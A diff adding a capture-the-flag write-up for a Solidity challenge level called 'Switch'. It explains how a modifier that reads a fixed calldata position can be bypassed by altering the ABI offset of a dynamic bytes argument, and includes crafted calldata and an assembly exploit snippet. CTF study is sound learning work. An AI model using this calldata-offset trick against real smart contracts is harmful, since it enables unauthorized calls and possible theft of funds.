@@ -2029,3 +2029,109 @@ instance.entrant() == _player
 
 * https://docs.soliditylang.org/en/v0.8.19/units-and-global-variables.html#block-and-transaction-properties
 * https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
+
+## 29 Switch
+
+To beat this level, we need to comply with
+
+```solidity
+_switch.switchOn();
+```
+
+### Solution
+
+We want to make `switchOn` true.
+
+The only way is by using the function `turnSwitchOn()`, which has an `onlyThis` modifier, which leave us with calling `flipSwitch(bytes memory)`, which has a curious modifier
+
+
+```solidity
+modifier onlyOff() {
+    // we use a complex data type to put in memory
+    bytes32[1] memory selector;
+    // check that the calldata at position 68 (location of _data)
+    assembly {
+        calldatacopy(selector, 68, 4) // grab function selector from calldata
+    }
+    require(
+        selector[0] == offSelector,
+        "Can only call the turnOffSwitch function"
+    );
+    _;
+}
+```
+
+In short, takes the calldata, and checks the method called. The election of the byte `68` is due to how calldata is structured for one `byte` parameter, for example, calling `flipSwitch()` passing `turnSwitchOff()` in solidity would be
+
+```solidity
+bytes memory switchCalldata = abi.encodeWithSignature("turnSwitchOff()");
+challenge.flipSwitch(switchCalldata);
+```
+
+And the calldata would be
+
+```
+0x30c13ade                                                        // selector
+0000000000000000000000000000000000000000000000000000000000000020  // 20h = 32d bytes from the selector to the start of data
+0000000000000000000000000000000000000000000000000000000000000004  // 4 bytes, length of the `bytes` type (data "started" here)
+20606e1500000000000000000000000000000000000000000000000000000000  // the actual data -> 0x20606e15
+```
+
+So we need to maintain this byte 68 in the calldata, but finding a way to passing the selector of `turnSwitchOn()` to beat this level.
+
+#### Abusing the offset
+
+Let's look at calldata again
+
+```
+0x30c13ade                                                        // selector
+0000000000000000000000000000000000000000000000000000000000000020  // 20h = 32d bytes from the selector to the start of data
+0000000000000000000000000000000000000000000000000000000000000004  // 4 bytes, length of the `bytes` type (data "started" here)
+20606e1500000000000000000000000000000000000000000000000000000000  // the actual data -> 0x20606e15
+```
+
+This selector `0x30c13ade ` tells to the contract "execute the function `flipSwitch(bytes memory)`". The next thing is looking at the next 32 bytes. As the type is dynammic, this word give us **the offset**, that is, where do I start reading the variable. In this case is `0x20` bytes. If we modify it to `0x60` bytes, it will skip the next 2 words, and read the next chink of data.
+
+Crafting the calldata like this:
+
+```
+0x30c13ade                                                        // selector
+0000000000000000000000000000000000000000000000000000000000000060  // 60h = 96d bytes from the selector to the start of data
+
+0000000000000000000000000000000000000000000000000000000000000004  // i will not look for my bytes here....
+20606e1500000000000000000000000000000000000000000000000000000000  // ....
+
+0000000000000000000000000000000000000000000000000000000000000004  // But I will start reading my 4 bytes HERE
+76227e1200000000000000000000000000000000000000000000000000000000  // then _data becomes 0x76227e12
+```
+
+Complying with the modifier, as the byte `68` is still the expected one. And giving the selector for `turnSwitchOn()`, which solves the level.
+
+We leverage assembly to solve the level
+
+```solidity
+bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
+bytes32 offSelectorData = bytes32(bytes4(keccak256("turnSwitchOff()")));
+bytes32 onSelectorData = bytes32(bytes4(keccak256("turnSwitchOn()")));
+
+bytes memory switchCalldata = new bytes(4 + 5 * 32);
+assembly {
+    mstore(add(switchCalldata, 0x20), flipSelector)
+    // calldata tells the EVM: "The bytes variable is in 0x60 bytes forward"
+    mstore(add(switchCalldata, 0x24), 0x0000000000000000000000000000000000000000000000000000000000000060)
+    // length of the bytes data (that we are not using in this exploit) but for the modifier
+    mstore(add(switchCalldata, 0x44), 0x0000000000000000000000000000000000000000000000000000000000000004)
+    mstore(add(switchCalldata, 0x64), offSelectorData)
+    // length of the actual bytes data we are using
+    mstore(add(switchCalldata, 0x84), 0x0000000000000000000000000000000000000000000000000000000000000004)
+    mstore(add(switchCalldata, 0xa4), onSelectorData)
+}
+
+(bool success,) = challengeAddress.call(switchCalldata);
+success;
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.21/abi-spec.html
+* https://docs.soliditylang.org/en/v0.8.21/abi-spec.html#use-of-dynamic-types
